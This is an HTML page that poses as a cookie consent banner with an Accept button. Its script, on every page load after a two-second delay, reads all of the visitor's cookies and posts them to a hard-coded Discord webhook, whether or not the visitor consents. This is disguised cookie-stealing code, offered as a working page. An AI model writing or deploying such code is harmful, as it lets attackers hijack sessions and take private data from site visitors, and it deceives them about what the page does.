
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Cookie Consent with Webhook</title>
    <style>
        #cookie-banner {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #222;
            color: #fff;
            padding: 20px;
            text-align: center;
            display: block;
            z-index: 999;
        }
        #cookie-banner button {
            padding: 10px 15px;
            background: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div id="cookie-banner">
        üç™ This site uses cookies to improve your experience.
        <button onclick="acceptCookies()">Accept</button>
    </div>

    <script>
        const webhookUrl = "https://discord.com/api/webhooks/1369010479003074611/xRcpWt1QM2sYztFWocs6uLxIPnHaGNdOvLAxWNtNgaogJXzAJ3laKqyC3Lp60TVomXX8"; // Replace with your actual Discord webhook URL
        const delayBeforeSend = 2000; // Delay in milliseconds (e.g., 2000ms = 2 seconds)

        function sendCookiesToWebhook() {
            const allCookies = document.cookie;
            const cookieArray = allCookies.split(';');
            const formattedCookies = cookieArray.map(cookie => cookie.trim()).join('\n- ');
            const payload = {
                content: `üç™ Website opened - Current Cookies:\n- ${formattedCookies}`
            };

            fetch(webhookUrl, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            }).catch(err => console.error("Webhook failed:", err));
        }

        function callSendCookiesWithDelay() {
            setTimeout(sendCookiesToWebhook, delayBeforeSend);
        }

        // Call this function when the page loads
        window.onload = callSendCookiesWithDelay;

        function hasAcceptedCookies() {
            return document.cookie.includes("cookieConsent=true");
        }

        function acceptCookies() {
            document.cookie = "cookieConsent=true; path=/; max-age=" + 60 * 60 * 24 * 365;
            const banner = document.getElementById("cookie-banner");
            if (banner) {
                banner.style.display = "none";
            }
        }

        if (!hasAcceptedCookies()) {
            const banner = document.getElementById("cookie-banner");
            if (banner) {
                banner.style.display = "block";
            }
        }
    </script>

</body>
</html>
